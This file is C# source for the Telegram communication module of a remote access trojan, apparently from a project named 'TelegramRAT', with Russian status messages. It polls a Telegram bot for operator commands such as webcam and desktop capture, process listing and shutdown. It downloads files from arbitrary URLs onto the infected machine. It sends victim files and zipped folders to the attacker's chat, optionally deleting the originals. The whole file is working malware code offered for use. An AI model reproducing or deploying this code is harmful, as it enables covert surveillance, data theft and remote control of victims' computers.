using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Threading;

using SimpleJSON;

namespace TelegramRAT
{
    public class telegram
    {

        public static Thread waitCommandsThread = new Thread(waitCommands);
        public static bool waitThreadIsBlocked = false;
        public static string keyboardJson = 
            @"{'keyboard':[
            [{'text':'/help'}],
            [{'text':'/computerInfo'},{'text':'/whois'}],
            [{'text':'/webcam'},{'text':'/desktop'}],
            [{'text':'/processList'}],
            [{'text':'/shutdown'},{'text':'/reboot'},{'text':'/hibernate'},{'text':'/logoff'}]],
            'resize_keyboard':true}"
            .Replace("'","\"").Replace(" ","").Replace("\n", "").Replace("\r","");

        private static void waitForUnblock()
        {
            while (true)
            {
                if (waitThreadIsBlocked)
                {
                    Thread.Sleep(5);
                    continue;
                }
                else
                {
                    break;
                }
            }
        }


        private static void waitCommands()
        {
            waitForUnblock();
            int LastUpdateID = 0;
            string response;
            using (WebClient client = new WebClient())
                response = client.DownloadString($"https://api.telegram.org/bot{config.TelegramToken}/getUpdates");
            LastUpdateID = JSON.Parse(response)["result"][0]["update_id"].AsInt;

            while (true)
            {
                Thread.Sleep(Convert.ToInt32(config.TelegramCommandCheckDelay) * 10);
                waitForUnblock();
                LastUpdateID++;
                using (WebClient client = new WebClient())
                    response = client.DownloadString($"https://api.telegram.org/bot{config.TelegramToken}/getUpdates?offset={LastUpdateID}");
                var json = JSON.Parse(response);

                foreach (JSONNode r in json["result"].AsArray)
                {
                    JSONNode message = r["message"];
                    string chatid = message["chat"]["id"];
                    LastUpdateID = r["update_id"].AsInt;

                    if (chatid != config.TelegramChatID)
                    {
                        string username = message["chat"]["username"];
                        string firstname = message["chat"]["first_name"];
                        sendText($"👑 Вы не являетесь администратором {firstname}", chatid);
                        sendText($"👑 Пользователь с ID {chatid} и UserName @{username} отправил команду боту!");
                        break;
                    }
                    if (message.HasKey("document"))
                    {
                        string fileName = message["document"]["file_name"];
                        string fileID = message["document"]["file_id"];
                        JSONNode filePath;
                        using (WebClient client = new WebClient())
                        {
                            filePath = JSON.Parse(client.DownloadString(
                                "https://api.telegram.org/bot" +
                                config.TelegramToken +
                                "/getFile" +
                                "?file_id=" + fileID
                            ))["result"]["file_path"];
                        }
                        DownloadFile(fileName, filePath);
                    }
                    else if (message.HasKey("text"))
                    {
                        string command = message["text"];
                        if (!command.StartsWith("/")) { continue; }
                        Thread t = new Thread(() => commands.handle(command));
                        t.SetApartmentState(ApartmentState.STA);
                        t.Start();
                    }
                    else
                    {
                        sendText("🍩 Неизвестный тип!");
                    }
                }
            }
        }

        public static void sendFile(string file, string type = "Document")
        {
            waitForUnblock();
            if (!File.Exists(file))
            {
                sendText("❌ Файл не найден!");
                return;
            }
            using (HttpClient httpClient = new HttpClient())
            {
                MultipartFormDataContent fform = new MultipartFormDataContent();
                var file_bytes = File.ReadAllBytes(file);
                fform.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), type.ToLower(), file);
                var rresponse = httpClient.PostAsync(
                    "https://api.telegram.org/bot" +
                    config.TelegramToken +
                    "/send" + type +
                    "?chat_id=" + config.TelegramChatID,
                    fform
                );
                rresponse.Wait();
                httpClient.Dispose();
            }
        }

        public static void sendText(string text, string chatID)
        {
            waitForUnblock();
            using (WebClient client = new WebClient())
            {
                client.DownloadString(
                    "https://api.telegram.org/bot" +
                    config.TelegramToken +
                    "/sendMessage" +
                    "?chat_id=" + chatID +
                    "&text=" + text
                );
            }
        }

        public static void sendText(string text)
        {
            sendText(text, config.TelegramChatID);
        }

        public static void replyKeyboardMarkup(string text)
        {
            waitForUnblock();
            using (WebClient client = new WebClient())
            {
                client.DownloadString(
                    "https://api.telegram.org/bot" +
                    config.TelegramToken +
                    "/sendMessage" +
                    "?chat_id=" + config.TelegramChatID +
                    "&text=" + text +
                    "&reply_markup=" + keyboardJson
                );
            }
        }


        public static void sendImage(string file)
        {
            sendFile(file, "Photo");
        }

        public static void sendVoice(string file)
        {
            sendFile(file, "Voice");
        }


        public static void DownloadFile(string file, string path = "")
        {
            waitForUnblock();
            if (file.StartsWith("http"))
            {
                sendText($"📄 Загрузка файла \"{Path.GetFileName(file)}\" по ссылке");
                try
                {
                    using (WebClient client = new WebClient())
                        client.DownloadFile(new Uri(file), Path.GetFileName(file));
                }
                catch
                {
                    sendText(String.Format("💥 Ошибка соеденения"));
                    return;
                }

                sendText($"💾 File \"{file}\" saved in: \"{Path.GetFullPath(Path.GetFileName(file))}\"");
            }
            else
            {
                sendText($"📄 Скачивание файла : {file}");
                path = @"https://api.telegram.org/file/bot" + config.TelegramToken + "/" + path;
                using (WebClient client = new WebClient())
                    client.DownloadFile(new Uri(path), file);
                sendText($"💾 Файл {file} сохранен в: {Path.GetFullPath(file)}");
            }
        }

        public static void UploadFile(string file, bool removeAfterUpload = false)
        {
            waitForUnblock();
            if (File.Exists(file))
            {
                sendText("📃 Выгрузка файла...");
                sendFile(file);
                if (removeAfterUpload)
                {
                    File.Delete(file);
                }
            }
            else if (Directory.Exists(file))
            {
                sendText("📁 Выгрузка директории...");
                string zfile = file + ".zip";
                if (File.Exists(zfile))
                { File.Delete(zfile); }
                System.IO.Compression.ZipFile.CreateFromDirectory(file, zfile);
                sendFile(zfile);
                File.Delete(zfile);
            }
            else
            {
                sendText("❌ Файл не найден!");
                return;
            }
        }

        public static void sendConnection()
        {
            replyKeyboardMarkup("✅ Бот подключен");
        }

        public static void sendDisconnection()
        {
            sendText("❌ Бот отключен");
        }
    }
}
